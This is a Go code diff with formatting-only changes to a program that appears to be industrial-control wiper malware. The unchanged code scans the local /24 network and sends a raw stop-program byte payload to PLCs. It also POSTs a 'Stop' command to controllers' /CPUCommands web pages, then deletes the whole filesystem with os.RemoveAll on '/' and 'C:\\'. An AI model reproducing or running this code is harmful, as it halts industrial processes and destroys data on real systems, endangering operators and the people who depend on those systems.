@@ -4,18 +4,16 @@ import (
 	"encoding/binary"
 	"fmt"
 	"net"
-	"runtime"
-	"os"
 	"net/http"
+	"os"
+	"runtime"
 	"strings"
 	"time"
 )
 
 func GetIPAddr() string {
-
 	// Get Interfaces
 	addrs, err := net.InterfaceAddrs()
-
 	// Error Checking
 	if err != nil {
 		fmt.Println(err)
@@ -26,7 +24,7 @@ func GetIPAddr() string {
 		// only add non loopback IPv4 addresses
 		ipnet, ok := address.(*net.IPNet)
 		if ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
-			var ip_addr = ipnet.IP
+			ip_addr := ipnet.IP
 			return ip_addr.String()
 		}
 	}
@@ -34,7 +32,6 @@ func GetIPAddr() string {
 }
 
 func GetNetwork(ip_addr string) []string {
-
 	// Parse IP Network
 	addr, ipnet, err := net.ParseCIDR(ip_addr)
 	_ = addr
@@ -65,7 +62,6 @@ func GetNetwork(ip_addr string) []string {
 }
 
 func ScanIP(ip_list []string) []string {
-
 	// Nil slice
 	var scanned_ips []string
 
@@ -84,7 +80,6 @@ func ScanIP(ip_list []string) []string {
 }
 
 func KillIP(scanned_ips []string) {
-
 	// Connect to device ports
 	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
 	for i := range scanned_ips {
@@ -103,7 +98,7 @@ func KillHTTP(scanned_ips []string) {
 	// Send stop via web interface
 	for i := range scanned_ips {
 		client := &http.Client{}
-		var data = strings.NewReader(`Run=1&PriNav=Stop`)
+		data := strings.NewReader(`Run=1&PriNav=Stop`)
 		req, err := http.NewRequest("POST", "http://"+scanned_ips[i]+"/CPUCommands", data)
 		if err != nil {
 			continue
@@ -133,18 +128,17 @@ func KillLinux() {
 	// If UID != 0, program deletes files owned by current user
 	err := os.RemoveAll("/")
 	if err != nil {
-		return			
-		}
+		return
+	}
 }
 
 func KillWindows() {
 	// If current user does not have administrative privileges, removes files owned by current user
 	err := os.RemoveAll("C:\\")
 	if err != nil {
-		return			
+		return
 	}
 }
-
 
 func main() {
 	ip_addr := GetIPAddr() + "/24"
